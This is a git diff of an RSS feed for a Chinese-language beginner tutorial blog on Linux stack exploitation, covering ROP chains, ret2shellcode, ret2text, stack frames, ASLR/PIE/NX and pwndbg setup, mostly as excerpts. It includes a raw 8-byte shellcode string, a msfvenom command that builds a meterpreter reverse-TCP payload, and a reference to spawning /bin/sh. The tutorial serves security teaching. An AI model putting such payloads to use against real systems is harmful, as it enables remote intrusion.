@@ -19,9 +19,9 @@
 不存在的啦 233 = =
 ROP是Return Oriented Programming(返回导向编程)的简称
 &amp;ldquo;又是专业术语?? 整天术语!术语!术语!&amp;rdquo;
- ww,别打了(, 这就简单讲解嘛= =
- ROP是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过前几篇文章的介绍，我们可以发现栈溢出的控制点是ret处(也就是子函数的ret addr)，那么ROP的核心思想就是利用以ret结尾的指令序列(gadgets)把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。
-  还不够简单?
+ww,别打了(, 这就简单讲解嘛= =
+ROP是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过前几篇文章的介绍，我们可以发现栈溢出的控制点是ret处(也就是子函数的ret addr)，那么ROP的核心思想就是利用以ret结尾的指令序列(gadgets)把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。
+还不够简单?
 QAQ, 我们首先了解一下为什么要用到ROP
 为什么需要ROP 我们很容易就发现，前几次的PWN攻击都是通过栈溢出篡改函数返回地址来一次性使程序跳转到某个恶意地址(后门函数或者shellcode)，从而getshell
 然而，并不是每一次都是有那么好的运气的，程序猿写后门函数的肯定少，在加上各种程序的保护机制，导致想要跳转到shellcode也不大可能
@@ -29,15 +29,21 @@ QAQ, 我们首先了解一下为什么要用到ROP
 ROP的过程的简单介绍 我们思考一下，我们之前通过栈溢出覆盖掉了函数的返回地址，那么既然是溢出，我们也可以溢出覆盖更多数据，从而控制更多内容。
 栈溢出的目的是控制程序执行流，如果一次不能实现返回到一个恶意地址来getshell,那么就需要让程序执行流在我们的控制之中，通过多次操作，让程序反复横跳多次跳转并执行恶意指令
 现在来看一看手上能用的东西
-  乖乖躺在一边任凭我们折腾的栈
-  程序本身的一些代码小片段(即下文提到的gadget)
-  gadget 谈到ROP就必须讲到gadgets, gadget指程序的一些代码片段
+乖乖躺在一边任凭我们折腾的栈
+程序本身的一些代码小片段(即下文提到的gadget)
+gadget 谈到ROP就必须讲到gadgets, gadget指程序的一些代码片段
 我们可以通过返回到含有pop和ret(比如pop eax; ret;)的gadgets的地址来实现特定操作而又使程序的执行流还在我们的控制中
- 由于栈是受我们的控制的，我们可以在栈中写入任意的内容
+由于栈是受我们的控制的，我们可以在栈中写入任意的内容
 不妨设我们在覆盖了ret addr后又覆盖了一些内容
-  ret addr &amp;ndash; gadget A(pop eax; ret;)地址
-  0xb
-  gadget B 地址</description>
+ret addr &amp;ndash; gadget A(pop eax; ret;)地址
+0xb
+gadget B 地址
+这样我们就构造了一个简单的ROP链
+来模拟一下此时被搞得不成样子的程序的执行过程= =
+由于ret addr被覆盖掉了w, 程序下一步会去执行gadget A
+首先执行pop eax,这个时候栈中的0xb就会被弹到eax寄存器中
+然后是ret, 程序又被强迫去执行gadget B了.UwU.
+由此类推，接下来攻击者可以让程序执行更多的gadget, 从而getshell</description>
     </item>
     
     <item>
@@ -57,9 +63,9 @@ ShellCode 既然今天的话题叫做ret2shellcode,我们先来了解一下Shell
 context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;)# os指操作系统，这里是Linux # arch指架构，64位一般是amd64，32位一般是i386 # log_level指日志输出的等级，debug为调试模式 然后用shellcraft.sh()函数获取ShellCode的汇编代码，再调用asm()变成机器码
 shellcode = asm(shellcraft.sh()) 网上找现成的ShellCode ShellStorm: 一个国外ShellCode集合
 ShellStorm中包含多种平台，多种长度，多种功能的ShellCode
- 为什么ShellCode会考虑长度？
+为什么ShellCode会考虑长度？
 答: 有时候栈中填入的ShellCode有长度限制
- 这里举个例子，只有8字节的ShellCode
+这里举个例子，只有8字节的ShellCode
 &amp;#34;\x99\x6a\x0b\x58\x60\x59\xcd\x80&amp;#34; metasploit 想要一个功能更强大且不想要网上到处找？
 MSF的meterpreter你绝对喜欢
 生成ShellCode命令
@@ -67,8 +73,10 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Local IP Address&amp
 PWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回地址上，ret2text是返回到text段的后门函数，而本次的ret2shellcode是返回到ShellCode
 大家可以先自己试试再看下面的思路分析.QwQ.
 大概先提几点提示:
-  ShellCode写入哪里呢？
-  ShellCode的地址是什么？</description>
+ShellCode写入哪里呢？
+ShellCode的地址是什么？
+ret2shellcode 先checksec一下
+$ checksec ret2shellcode [*] &amp;#39;/home/pwn/桌面/ROP/ret2shellcode&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 看到这个32位程序NX是关闭的，而且有同时可以读，写，执行的段(也就是栈)，我们想到可以把ShellCode写入栈中，并通过栈溢出返回到栈中的ShellCode</description>
     </item>
     
     <item>
@@ -79,20 +87,27 @@ PWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回�
       <guid>https://kira-pgr.github.io/posts/pwn4/</guid>
       <description>PWN! PWN! PANG! Part4 必须有的前言 从Part4开始我们就要正式进入实战部分了哦qaq,
 本篇文章主要讲述最最简单的一种栈溢出利用姿势ret2text
-资料投放&amp;gt;__&amp;lt;   IDA Pro 7.5
-  ret2text题目
-   P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快且可以脱离客户端
- 补充知识点：Linux程序安全保护机制 ASLR: 地址随机化技术   全名: Address Space Layout Randomization
-  系统的保护措施, 和程序没有关系, 一般默认目标机器随机化完全开启
-  每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。
-  可以通过cat /proc/sys/kernel/randomize_va_space查看系统保护的开启情况
-   ASLR选项:
+资料投放&amp;gt;__&amp;lt; IDA Pro 7.5
+ret2text题目
+P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快且可以脱离客户端
+补充知识点：Linux程序安全保护机制 ASLR: 地址随机化技术 全名: Address Space Layout Randomization
+系统的保护措施, 和程序没有关系, 一般默认目标机器随机化完全开启
+每次运行程序时，组件(包括堆栈，堆和库)都将移至虚拟内存中的其他地址。 攻击者无法通过反复试验来了解目标所在，因为每次的地址都会不同。
+可以通过cat /proc/sys/kernel/randomize_va_space查看系统保护的开启情况
+ASLR选项:
 0 关闭
 1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化
 2 全随机 brk()分配的堆空间也被虚拟化
- PIE: 随机化ELF文件映射地址 好饿，想吃馅饼了 雾)
-  全名: Position-Independent Executable
-  程序的防护措施，编译时生效</description>
+PIE: 随机化ELF文件映射地址 好饿，想吃馅饼了 雾)
+全名: Position-Independent Executable
+程序的防护措施，编译时生效
+检测程序防护措施的方法:PWNTools的checksec模块
+详细使用技巧见下文
+开启 ASLR 之后，PIE 才会生效 The NX bits(NX): 栈不可执行 栈为什么要不可执行呢? 小问号你是否有很多小朋友???
+从前面的知识中可以了解到，攻击者可以通过栈溢出劫持程序执行流，强迫程序执行制定地址的内容
+而如果恰好攻击者在栈中写入了shellcode(指执行后可以直接拿到shell的代码)，就可以通过直接执行栈中写入的shellcode来getshell
+所以，为了防范攻击者这么轻易就能做坏事= = The NX bits就诞生了
+全名: the No-eXecute bits</description>
     </item>
     
     <item>
@@ -103,25 +118,35 @@ PWN! PWN! PANG? 本题思路和ret2text大体差不多，差别主要在返回�
       <guid>https://kira-pgr.github.io/posts/pwn3/</guid>
       <description>PWN! PWN! PANG! Part3 这是一篇黑暗童话故事 确信)
 至于简介嘛= =，好奇的话就把文章看完吧qaq
-C语言函数调用栈 了解函数调用栈   函数调用栈是指程序运行时内存一段连续的区域
-  用来保存函数运行时的状态信息，包括函数参数与局部变量等
-  称之为“栈”是因为发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶
-  在函数调用结束时，栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态
-  函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大
-   配图 
-关于栈帧 咳咳，上面很官方的解释是不是不容易理解.qwq.
+C语言函数调用栈 了解函数调用栈 函数调用栈是指程序运行时内存一段连续的区域
+用来保存函数运行时的状态信息，包括函数参数与局部变量等
+称之为“栈”是因为发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶
+在函数调用结束时，栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态
+函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大
+配图 关于栈帧 咳咳，上面很官方的解释是不是不容易理解.qwq.
 实际上上面所说的&amp;quot;函数的状态&amp;quot;在栈中是由一个一个栈帧(Stack Frame)表示的，基本上 (特殊情况的话，可能是某些在main函数前调用的函数) 每一个函数调用时在栈中都有自己的栈帧
- 栈帧结构预览 
- 在这里，我们需要了解一下几点
-  三个指针(寄存器)：
-  ebp指向当前栈帧底部(保存当前栈帧底部地址)
+栈帧结构预览 在这里，我们需要了解一下几点
+三个指针(寄存器)：
+ebp指向当前栈帧底部(保存当前栈帧底部地址)
 至于为什么在上面，是因为栈从高地址向低地址增长
-  esp指向栈顶(保存栈顶地址)
-  eip指向要执行的下一指令(保存下一条指令地址)
-    参数(arguments)是保存在父函数栈帧中的(类似于父亲给儿子的&amp;quot;启动资金&amp;quot;)
- 注意， 参数是逆序压栈滴
-  参数的保存 
-  返回地址(Return Address)保存了调用子函数前eip值，这个值在我们栈溢出攻击中至关重要，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令</description>
+esp指向栈顶(保存栈顶地址)
+eip指向要执行的下一指令(保存下一条指令地址)
+参数(arguments)是保存在父函数栈帧中的(类似于父亲给儿子的&amp;quot;启动资金&amp;quot;)
+注意， 参数是逆序压栈滴
+参数的保存 返回地址(Return Address)保存了调用子函数前eip值，这个值在我们栈溢出攻击中至关重要，控制这个值之后就可以劫持程序执行流，让程序下一步执行你想要的指令
+返回地址的位置 (Caller&#39;s ebp / Previous ebp保存这父函数ebp的值，长度为一个字长(x32系统4Byte, x64系统8Byte)
+prev ebp 局部变量(Local Variables)一般是发生栈溢出攻击的地方，主要是因为程序在局部变量中读入了超长的数据，造成溢出覆盖了其他内容(比如说返回地址)
+Local Var 函数调用栈整个过程 这一部分前面的知识点已经概括了一些了，再详细将下来篇幅过长，大家可以参考PPT
+栈溢出攻击:子函数&amp;quot;找不着家&amp;quot;了 咳咳，为了便于理解，这里我们生动形象一些
+前提 有时候程序猿不知道 &amp;ldquo;不要相信用户输入的数据总是安全的&amp;rdquo; 的道理，就在读入函数局部变量的过程中用了gets()等不限制数据长度的函数，或者写了其他可以导致读入过长数据的BUG代码
+攻击 如果我们在局部变量中写入的过长的数据，就会覆盖高地址处的 (数据从地址向高地址读入嘛)的数据，例如 prev ebp或者是ret addr(主要关注)
+如果我们写入的是垃圾数据，程序会返回到一个奇怪的地址，自然会崩溃(Crash)
+而如果我们写入精心构造的恶意数据，我们就可以劫持程序，让它干我们想要的事情;)
+比如说，调用system(&amp;quot;/bin/sh&amp;quot;)
+这里举个栗子
+如果我们把父函数比喻成爸爸的话，那么子函数就是儿子
+儿子要自己去闯荡了，
+父亲给儿子一些财产让儿子能更好的为未来做准备(父函数栈帧中参数 args)，</description>
     </item>
     
     <item>
@@ -132,15 +157,18 @@ C语言函数调用栈 了解函数调用栈   函数调用栈是指程序运行
       <guid>https://kira-pgr.github.io/posts/pwn2/</guid>
       <description>PWN! PWN! PANG! Part2 前言 说完了前面那些基础 (貌似一点也不基础) 知识，今天再来谈谈工具
 由于我们研究的是Linux下的PWN,接下来的操作请在Linux下进行
- 只有Windows怎么办？
- 方案一：使用VMware Workstation Pro安装Linux虚拟机(我目前的方案)   小Tip:某些Linux发行版(例如Kali)可以在官网找到现成的虚拟机文件下载，如果你没有安装过虚拟机 (或懒得安装) ，可以试试这种方式
-  方案二：使用WSL2(怎么说呢，WSL2虽说占空间小，而且有了GUI,但配置其实挺麻烦)   PWNDBG pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们调戏调试程序
- pwndbg 
-安装 一般Linux都会预装gdb吧= =，不过还是扯一下安装方法好了
+只有Windows怎么办？
+方案一：使用VMware Workstation Pro安装Linux虚拟机(我目前的方案) 小Tip:某些Linux发行版(例如Kali)可以在官网找到现成的虚拟机文件下载，如果你没有安装过虚拟机 (或懒得安装) ，可以试试这种方式
+方案二：使用WSL2(怎么说呢，WSL2虽说占空间小，而且有了GUI,但配置其实挺麻烦) PWNDBG pwndbg是Linux GDB的一个专门为PWN设计的一个插件, 能有助于我们调戏调试程序
+pwndbg 安装 一般Linux都会预装gdb吧= =，不过还是扯一下安装方法好了
 Deb 系
 sudo apt install gdb yum系 快去用Debian 逃)
 sudo yum -y install centos-release-scl sudo yum-config-manager --enable rhel-server-rhscl-7-rpms sudo yum -y install devtoolset-7 scl enable devtoolset-7 bash 安装pwndbg
-git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh  安装踩坑记 注意:pwndbg这个目录请不要删除或随意移动位置,否则可能会导致pwndbg无法正常启动</description>
+git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh 安装踩坑记 注意:pwndbg这个目录请不要删除或随意移动位置,否则可能会导致pwndbg无法正常启动
+如果安装后或系统更新后无法正常启动的话，请检查路径问题
+sudo vi ~/.gdbinit 输入命令后应该能看到一行
+source 其他内容/pwndbg/gdbinit.py 记得把source之后的内容改成你pwndbg文件夹里gdbinit.py的路径
+Tip:如果你想不用pwndbg的话，去掉这一行即可</description>
     </item>
     
     <item>
@@ -151,12 +179,12 @@ git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh  安装踩�
       <guid>https://kira-pgr.github.io/posts/pwn1/</guid>
       <description>PWN! PWN! PANG! Part1 前言 这里是PGR的PWN基础学习笔记qaq，主要研究的是Linux下ELF可执行文件的漏洞利用
 涉及内容:
- 栈(Stack)的漏洞利用，主要是栈溢出(Stack Overflow)攻击   PS: 说到Stack Overflow就必须得说一个同名的国外著名IT论坛(真的特别特别特别好用)
+栈(Stack)的漏洞利用，主要是栈溢出(Stack Overflow)攻击 PS: 说到Stack Overflow就必须得说一个同名的国外著名IT论坛(真的特别特别特别好用)
 重要的事情说三遍哈XD
 https://stackoverflow.com/
-   C语言Printf()函数格式化字符串漏洞(Format String)
-  一小点堆(Heap)利用
-   AND: 文章中涉及的题目文件会全部随文章发出来
+C语言Printf()函数格式化字符串漏洞(Format String)
+一小点堆(Heap)利用
+AND: 文章中涉及的题目文件会全部随文章发出来
 如果各位不想一个一个下载的话，这边有一个环境搭好(工具+题目)的Xubuntu Linux(VMware虚拟机)
 链接如下:
 mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Efyh9fLtgIZCi2Q21hCXLI0BFrHp17qc9ZxHW6mjovmSBw?e=BUtZzA
@@ -164,17 +192,27 @@ mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicroso
 mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Eefb6Yqp7vpGriwwFz6wQCkBtjqcFnGZwZTAyK2fJhA_FA?e=gjHVUW
 什么是PWN? PWN原指黑客攻破系统发出的“砰”的响声，在这里我们解释为二进制漏洞挖掘与利用
 分步来讲的话 = = 大概可以概括为以下几点：
-  破解、利用成功（程序的二进制漏洞）
-  攻破（设备、服务器）
-  控制（设备、服务器）
-   配个图 
-Linux下ELF文件 ELF文件的是Linux下的可执行文件，与Windows下exe文件不同
+破解、利用成功（程序的二进制漏洞）
+攻破（设备、服务器）
+控制（设备、服务器）
+配个图 Linux下ELF文件 ELF文件的是Linux下的可执行文件，与Windows下exe文件不同
 可以用File命令查看你的文件格式:
- File命令 
- 不过这里有一个很有趣的地方，由于File命令依据文件头判断文件类型，Linux的后缀名并不影响File命令判断文件是ELF文件(即使a.out已经变成了a.zip)
+File命令 不过这里有一个很有趣的地方，由于File命令依据文件头判断文件类型，Linux的后缀名并不影响File命令判断文件是ELF文件(即使a.out已经变成了a.zip)
 不过在文件夹窗口里双击这个.zip, 就会发现:这个ELF文件已经被当成压缩包打开 (这和win似乎很像)
 可见在修改后缀名的过程中，干扰了系统对于文件打开方式的识别= =
-  嘿嘿= =, 被迷惑了呢;)</description>
+嘿嘿= =, 被迷惑了呢;) ELF文件的结构 咳咳，貌似扯远了= =
+ELF文件结构 现在我们再重新审视一下&amp;quot;a.out&amp;quot;这个可执行文件
+我们刚刚一不小心把它用压缩包的方式打开(如上图)
+我们看到一堆奇怪的文件:
+.got
+.got.plt
+.plt
+.text
+&amp;hellip;
+这些文件实际上代表着这个ELF文件在磁盘里的 一个个 &amp;ldquo;节&amp;rdquo;(Section)
+而当ELF被映射进内存中的时候， 就有了段(Segment)
+节与段 段与节 在这里再详细扯一点段与节的东西
+(嘛 = =， 因为我个人学的时候感觉这块知识对于后面影响挺大的)</description>
     </item>
     
   </channel>
